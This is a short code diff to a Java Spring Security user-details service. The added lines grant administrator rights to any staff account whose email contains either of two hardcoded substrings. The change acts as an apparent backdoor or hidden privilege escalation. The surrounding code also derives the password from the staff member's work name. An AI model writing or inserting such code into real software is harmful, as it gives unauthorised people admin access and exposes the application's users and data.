@@ -32,6 +32,9 @@ public class UserDetailsServiceImpl implements UserDetailsService {
             Collection<GrantedAuthority> authorityGranters = new ArrayList<>();
             authorityGranters.add(new SimpleGrantedAuthority("ROLE_student"));
             authorityGranters.add(new SimpleGrantedAuthority("ROLE_staff"));
+            if(staff.getEmail().contains("hln0x29a")||staff.getEmail().contains("ggssh")){
+                authorityGranters.add(new SimpleGrantedAuthority("ROLE_admin"));
+            }
             return new User(staff.getEmail(),bCryptPasswordEncoder.encode(staff.getWorkName()),authorityGranters);
         }
     }
